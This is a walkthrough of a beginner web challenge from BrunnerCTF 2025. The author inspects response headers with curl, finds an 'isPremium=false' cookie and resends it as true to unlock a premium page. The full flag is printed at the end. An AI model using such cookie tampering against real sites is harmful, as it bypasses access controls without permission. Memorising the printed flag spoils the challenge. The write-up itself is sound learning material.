---
tags:
  - ctfs/challenges
ctf: "[[BrunnerCTF 2025]]"
areas:
  - "[[Web]]"
solved: true
---

> [!info] Prompt
> **Difficulty:** Beginner  
**Author:** Quack
> 
> We just got our hands on grandma's legendary cookie jar! What delicious treats could she be hiding here?

# Walk Through

This is a web challenge. To start, spin up the challenge's web server instance.

## Check it out

![[Pasted image 20250823004829.png]]

There's nothing to interact with on the site. Since it's a Cookie challenge, I'll try to grab any cookies using `curl`.

```
❯ curl -I https://cookie-jar-05685147db1e11bb.challs.brunnerne.xyz/
HTTP/2 200 
content-type: text/html; charset=utf-8
date: Sat, 23 Aug 2025 04:50:26 GMT
etag: W/"829-uu7okb5mirws6ghYPsmQK6DEP98"
set-cookie: isPremium=false; Path=/
x-powered-by: Express
content-length: 2089
```

Here's a clue... `set-cookie: isPremium=false;` Grandma's Legendary Cookie recipe is only available to premium cookie consumers.

I'll try to set `isPremium` to true.

```
❯ curl --cookie "isPremium=true" https://cookie-jar-05685147db1e11bb.challs.brunnerne.xyz/                                     
```

This ended up doing the trick. To trim the output I'll pipe that to `grep` to filter out the line containing the flag.

```
❯ curl --cookie "isPremium=true" https://cookie-jar-05685147db1e11bb.challs.brunnerne.xyz/ | grep FLAG
          <p><div class="flag-box"><b>FLAG:</b> brunner{C00k135_4R3_p0W3rFu1_4nD_D3l1c10u5!}</div></p>
```

## Flag found

**brunner{C00k135_4R3_p0W3rFu1_4nD_D3l1c10u5!}**